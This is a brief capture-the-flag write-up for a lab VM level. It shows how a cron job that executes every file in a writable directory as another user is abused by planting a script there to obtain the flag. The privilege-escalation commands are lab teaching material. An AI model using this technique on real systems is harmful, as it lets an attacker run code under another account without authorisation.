## Shell command injection with a crontab

First of all, I saw a message when I started the VM : "You have a new mail"

Then, I checked the content of this one with ``cat /var/mail/level05`` it gave me this result :

``*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05``

After, I opened the ```/usr/sbin/openarenaserver``` file and I got :
````bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
````

In ``/opt/openarenaserver/`` I created a file named "getflag" and it content was : ```getflag > /tmp/flag ```

After waiting 2 minutes for the crontab, I just ``cat /tmp/flag`` and I got my flag :)
